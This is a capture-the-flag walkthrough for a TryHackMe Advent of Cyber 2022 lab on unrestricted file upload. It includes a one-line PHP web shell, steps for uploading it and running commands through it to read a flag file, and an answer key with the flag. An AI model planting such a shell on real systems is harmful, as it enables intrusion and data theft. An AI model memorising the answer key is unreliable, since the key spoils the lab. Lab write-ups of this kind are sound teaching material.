# Advent of Cyber 2022 - Day 15: Secure Coding

{% embed url="https://tryhackme.com/room/adventofcyber4" %}

## Background
Input validation flaws, specifically **Unrestricted File Upload** vulnerabilities leading to Remote Code Execution (RCE).

## Walkthrough
1. Access the web portal `SantaSideKick2`.
2. Test the resume/profile upload feature. The application fails to validate extensions or MIME types.
3. Upload a standard PHP reverse shell or web shell (`cmd.php`):
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Access the uploaded shell under `/uploads/cmd.php?cmd=whoami`.
5. Navigate to the HR Elf's Documents directory:
   ```text
   http://TARGET_IP/uploads/cmd.php?cmd=type C:\Users\HRElf\Documents\flag.txt
   ```
   The flag is retrieved: `THM{Naughty.File.Uploads.Can.Get.You.RCE}`.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Name given to file uploads allowing actors to upload anything? | `Unrestricted` |
| What is the title of the web app developed by Santa's freelancer? | `SantaSideKick2` |
| What is the flag stored in the HR Elf's Documents directory? | `THM{Naughty.File.Uploads.Can.Get.You.RCE}` |
